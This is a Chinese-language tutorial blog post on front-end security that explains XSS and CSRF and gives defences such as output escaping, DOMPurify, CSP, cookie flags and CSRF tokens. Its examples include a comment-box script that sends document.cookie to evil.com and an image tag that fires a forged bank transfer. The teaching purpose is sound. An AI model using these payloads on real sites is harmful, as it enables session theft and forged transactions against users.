---
title: 前端安全实战：XSS、CSRF 与 7 个防护踩坑点
description: 从攻击原理到防御落地，覆盖 XSS 注入、CSRF 伪造请求、CSP 策略等前端安全核心议题。
date: 2026-07-31
category: 前端
tags:
  - 安全
  - XSS
  - CSRF
  - 实战
---

# 前端安全实战：XSS、CSRF 与 7 个防护踩坑点

前端安全不是后端专属话题。XSS（跨站脚本）和 CSRF（跨站请求伪造）是前端必须亲自防守的两个核心威胁。本文讲清攻击原理，再给出可落地的防护方案。

## 一、XSS：注入恶意脚本

### 攻击原理

攻击者把恶意代码注入页面，在**受害者浏览器**中执行，可窃取 Cookie、会话、用户数据。

### 三种类型

| 类型 | 特点 | 场景 |
|------|------|------|
| 存储型 | 恶意代码存到服务器，所有访问者中招 | 评论区、用户昵称 |
| 反射型 | 恶意代码在 URL 参数中，诱导点击 | 搜索页、报错页 |
| DOM 型 | 纯前端漏洞，不经过服务器 | innerHTML 渲染用户输入 |

### 经典注入示例

```html
<!-- 在评论区输入 -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
<img src=x onerror="alert(document.cookie)">
```

## 二、XSS 防护：4 道防线

### 防线 1：输出编码（转义）

**核心原则：所有渲染用户输入的地方都必须转义。**

```javascript
// ❌ 危险：直接插入
element.innerHTML = userInput

// ✅ 安全：文本节点插入，浏览器不会解析为标签
element.textContent = userInput
```

框架层面的做法：

- **Vue**：模板插值 `{{ }}` 默认转义，`v-html` 是例外——**用 v-html 渲染不可信内容 = 裸奔**。
- **React**：JSX 默认转义，`dangerouslySetInnerHTML` 是例外。

```vue
<!-- Vue：v-html 只允许渲染服务端已消毒的富文本 -->
<div v-html="safeRichText"></div>
```

### 防线 2：输入校验与消毒

- 富文本场景用成熟库消毒：`DOMPurify`（前端）或后端 `sanitize-html`。
- 服务端校验格式（邮箱、URL、白名单标签），**永远不要信任前端传来的内容**。

```javascript
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(dirtyHtml)
```

### 防线 3：CSP（内容安全策略）

CSP 是"最后一道保险"——即使注入成功也拦下来：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline'
```

**坑**：CSP 配太严会误伤正常功能（如第三方统计脚本、内联样式），配太松形同虚设。需要逐步收紧并在灰度环境验证。

### 防线 4：Cookie 安全属性

```http
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JS 无法读取，**防 XSS 窃取 Cookie 的核心**。
- `Secure`：仅 HTTPS 传输。
- `SameSite`：防止跨站携带（同时防御 CSRF）。

## 三、CSRF：伪造用户请求

### 攻击原理

用户在已登录的 A 站，访问恶意 B 站页面，B 站悄悄向 A 站发请求。浏览器**自动携带 A 站 Cookie**，服务器误以为是用户本人操作。

### 典型攻击

```html
<!-- 恶意页面：自动提交表单到银行转账接口 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

### CSRF 防护

| 方案 | 说明 |
|------|------|
| SameSite Cookie | 现代浏览器首选，`SameSite=Lax/Strict` 阻止跨站携带 |
| CSRF Token | 表单带随机 token，服务器校验，需前后端配合 |
| 双重 Cookie | 请求头携带 Cookie 中的值，服务器比对 |
| 自定义请求头 | 校验 `X-Requested-With` 等，跨站无法自动添加 |

## 四、7 个高频踩坑点

## 坑 1：v-html / dangerouslySetInnerHTML 渲染用户内容

**踩坑现场**：为了省事直接用 `v-html` 渲染后端返回的评论内容，被存储型 XSS 打穿。

**修复**：富文本必须消毒；纯文本用插值/文本节点。

## 坑 2：拼接 URL 参数导致 SQL 注入/二次注入

**踩坑现场**：

```javascript
// 把用户输入拼进请求 URL
fetch(`/api/search?q=${userInput}`)
```

**修复**：用 `URLSearchParams` 编码，服务端参数化查询：

```javascript
const params = new URLSearchParams({ q: userInput })
fetch(`/api/search?${params}`)
```

## 坑 3：信任同源（Same-Origin）就放松校验

**踩坑现场**：认为"同源请求就是安全的"，跳过权限校验。

**真相**：同源 ≠ 可信。用户的恶意脚本在**他自己的会话里**发起请求，权限校验依然必须做（服务端鉴权、CSRF 防护双管齐下）。

## 坑 4：eval / new Function 执行不可信代码

```javascript
// ❌ 永远不要对不可信输入用 eval
eval(userInput)
```

**修复**：用 JSON.parse 解析数据，用白名单映射替代动态执行。

## 坑 5：CSP 里滥用 unsafe-inline

**踩坑现场**：为了图省事 `script-src 'unsafe-inline'`，CSP 等于没开。

**修复**：必须内联脚本时用 `'nonce-xxx'` 或 hash 白名单：

```http
Content-Security-Policy: script-src 'nonce-随机值'
```

## 坑 6：上传文件不做类型校验

**踩坑现场**：上传接口只查扩展名（`.jpg`），攻击者传 `.jpg` 内容的 HTML/JS，通过 CDN 域名执行。

**修复**：校验 MIME + 文件头魔数 + 尺寸限制；文件存储用独立域名并禁止执行脚本。

## 坑 7：忽略第三方依赖漏洞

**踩坑现场**：项目依赖有已知 CVE，被自动化攻击扫描命中。

**修复**：CI 里加依赖扫描：

```bash
npm audit
# 或
npx audit-ci --moderate
```

## 五、前端安全自查清单

- [ ] 所有用户输入渲染位置都做了转义/消毒
- [ ] v-html / dangerouslySetInnerHTML 数量为零或全部安全
- [ ] Cookie 设置了 HttpOnly + Secure + SameSite
- [ ] 部署了 CSP 策略
- [ ] 上传文件做了类型与大小校验
- [ ] 依赖定期 npm audit
- [ ] 生产环境关闭 debug 信息、报错详情泄露

## 总结

| 威胁 | 核心防护 |
|------|---------|
| XSS 存储/反射/DOM | 输出转义 + 输入消毒 + CSP + HttpOnly |
| CSRF | SameSite Cookie + Token 校验 |
| 第三方风险 | 依赖审计 + 最小权限 |

前端安全的心法：**"永远不要信任任何输入"**——不管是 URL 参数、表单内容还是后端返回的数据。把这条原则写进代码评审清单，比记住所有攻击细节更管用。
